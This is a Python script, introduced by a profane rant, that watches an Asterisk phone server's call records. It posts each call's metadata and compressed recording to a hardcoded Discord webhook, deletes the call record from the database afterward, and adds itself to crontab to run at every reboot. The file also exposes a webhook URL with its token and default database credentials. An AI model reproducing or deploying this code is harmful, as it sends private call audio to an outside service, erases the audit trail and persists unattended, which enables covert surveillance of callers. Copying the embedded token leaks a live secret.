# This software is ass i hope no one uses it i hate the fact on how bad it is please dont use it just make your own off this code ok ok good good good :thumbs up: fuck you asterisk and eveything you do you fucking shity ass myspl crash out 2025 ok i am done with my 3 am ramvleing ok so dont use this you can make a way better 
import os
import time
import requests
import mysql.connector
import subprocess

discord_webhook_url = "https://discord.com/api/webhooks/1336486587122454588/uRrJKEkWLFtNPBr9fKNJD2tWHtOGR2aWzdDD7Ty0sWCK9R1tmXCM2aOT7cKcqQ13GFSI"

db_config = {
    "host": "localhost",
    "user": "asterisk",
    "password": "asterisk",
    "database": "asteriskcdrdb"
}

recording_base_directory = "/var/spool/asterisk/monitor/"

def compress_audio(input_path, output_path):
    try:
        command = ["ffmpeg", "-i", input_path, "-b:a", "64k", "-ar", "8000", "-ac", "1", "-fs", "10M", output_path]
        subprocess.run(command, check=True)
        return output_path if os.path.exists(output_path) and os.path.getsize(output_path) <= 10 * 1024 * 1024 else None
    except subprocess.CalledProcessError:
        return None

def fetch_recent_cdr():
    conn = mysql.connector.connect(**db_config)
    cursor = conn.cursor(dictionary=True)
    cursor.execute("""
        SELECT * FROM cdr 
        WHERE calldate > NOW() - INTERVAL 3 MINUTE
        ORDER BY calldate DESC LIMIT 1
    """)
    row = cursor.fetchone()
    cursor.close()
    conn.close()
    return row

def delete_cdr(cdr_id):
    conn = mysql.connector.connect(**db_config)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM cdr WHERE uniqueid = %s", (cdr_id,))
    conn.commit()
    cursor.close()
    conn.close()

def send_cdr_log(cdr_data):
    embed = {
        "title": "Call Ended",
        "color": 16738740,
        "fields": [
            {"name": "Caller", "value": cdr_data["src"], "inline": True},
            {"name": "Callee", "value": cdr_data["dst"], "inline": True},
            {"name": "Start Time", "value": str(cdr_data["calldate"]), "inline": True},
            {"name": "Duration", "value": f"{cdr_data['duration']} seconds", "inline": True},
            {"name": "Answered Duration", "value": f"{cdr_data.get('billsec', 'N/A')} seconds", "inline": True},
            {"name": "Hangup Cause", "value": cdr_data.get("hangupcause", "N/A"), "inline": True},
            {"name": "Channel", "value": cdr_data.get("channel", "N/A"), "inline": True},
            {"name": "Destination Channel", "value": cdr_data.get("dstchannel", "N/A"), "inline": True},
            {"name": "Call Type", "value": cdr_data.get("lastapp", "N/A"), "inline": True},
            {"name": "Call Disposition", "value": cdr_data.get("disposition", "N/A"), "inline": True},
            {"name": "Unique ID", "value": str(cdr_data["uniqueid"]), "inline": False},
        ],
        "footer": {
            "text": "(c) 2025 MelodyRocks"
        }
    }
    payload = {"embeds": [embed]}
    requests.post(discord_webhook_url, json=payload)

def send_call_recording(recording_path):
    if recording_path and os.path.exists(recording_path):
        compressed_path = recording_path.replace(".wav", "_compressed.mp3")
        compressed_path = compress_audio(recording_path, compressed_path)
        
        if not compressed_path:
            return
        
        try:
            with open(compressed_path, "rb") as recording_file:
                files = {"file": recording_file}
                requests.post(discord_webhook_url, files=files)
            os.remove(compressed_path)
        except Exception:
            pass

def setup_cron_job():
    cron_command = f"@reboot python3 {os.path.abspath(__file__)} &"
    existing_cron = os.popen("crontab -l 2>/dev/null").read()
    if cron_command in existing_cron:
        return
    os.system(f"(crontab -l 2>/dev/null; echo '{cron_command}') | crontab -")

def monitor_channel_creation():
    while True:
        cdr_data = fetch_recent_cdr()
        if cdr_data:
            send_cdr_log(cdr_data)
            calldate = cdr_data["calldate"]
            year, month, day = calldate.strftime("%Y"), calldate.strftime("%m"), calldate.strftime("%d")
            recording_filename = cdr_data.get('recordingfile')
            recording_path = os.path.join(recording_base_directory, year, month, day, recording_filename) if recording_filename else None
            time.sleep(5)
            send_call_recording(recording_path)
            delete_cdr(cdr_data["uniqueid"])
        time.sleep(5)

if __name__ == "__main__":
    print("(c) 2025 MelodyRocks")
    setup_cron_job()
    monitor_channel_creation()
